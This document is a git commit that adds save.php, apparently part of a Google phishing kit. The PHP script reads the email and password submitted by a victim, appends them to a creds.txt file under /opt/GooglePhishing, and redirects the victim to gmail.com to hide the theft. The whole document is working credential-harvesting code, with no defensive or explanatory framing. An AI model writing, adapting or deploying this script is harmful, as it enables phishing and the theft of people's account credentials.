9f0c6ddfbbd4a5160f0a51fc4a883eadd95641da
jakedmurphy1 <44781280+jakedmurphy1@users.noreply.github.com>
2022-05-31 11:30:15 -0400

    Add files via upload

---
+++ save.php
@@ -0,0 +1,18 @@
+<?php
+
+$username = $_GET['email'];
+$password = $_GET['password'];
+
+$myfile = fopen("/opt/GooglePhishing/creds.txt", "a") or die("Unable to open file, ensure filepath is correct (Line 6) and chmod 666 it.");
+
+fwrite($myfile, $username);
+fwrite($myfile, ":");
+fwrite($myfile, $password);
+fwrite($myfile, "\n");
+fclose($myfile);
+
+header("Location: https://gmail.com");
+
+die();
+
+?>
